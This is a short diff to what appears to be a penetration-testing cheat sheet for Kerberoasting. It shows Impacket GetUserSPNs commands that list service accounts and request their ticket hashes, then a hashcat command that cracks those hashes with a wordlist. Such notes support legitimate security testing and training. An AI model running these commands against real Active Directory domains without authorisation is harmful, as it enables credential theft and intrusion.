@@ -4,11 +4,11 @@
 
 ## Steps:
 
-#### 1) python3 Impacket-GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER
+#### 1) python3 Impacket-GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER:PASSWORD
 
 #### Insert Password:
 
-#### 2) python3 Impacket-GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER -request-user USER FOUND ON STEP 1
+#### 2) python3 Impacket-GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER:PASSWORD -request
 
 #### 3) hashcat -a 0 -m 13100 SPN.HASH /path/to/wordlist.txt
 
